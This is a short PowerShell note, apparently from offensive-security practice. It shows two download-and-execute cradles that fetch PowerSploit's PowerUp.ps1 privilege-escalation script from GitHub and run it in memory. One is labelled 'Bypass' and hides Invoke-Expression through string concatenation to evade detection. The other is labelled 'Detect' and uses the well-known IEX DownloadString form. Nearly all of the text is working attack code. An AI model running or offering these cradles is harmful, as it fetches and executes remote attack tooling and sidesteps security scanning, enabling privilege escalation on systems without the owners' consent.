Bypass 
######################################################################################################################################
$webreq = [System.Net.WebRequest]::Create(‘https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1’)
$resp=$webreq.GetResponse()
$respstream=$resp.GetResponseStream()
$reader=[System.IO.StreamReader]::new($respstream)
$content=$reader.ReadToEnd()
 &('I'+'EX')($content)
#######################################################################################################################################
Detect
IEX(New-Object Net.WebClient).DownloadString(‘https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1’)
######################################################################################################################################
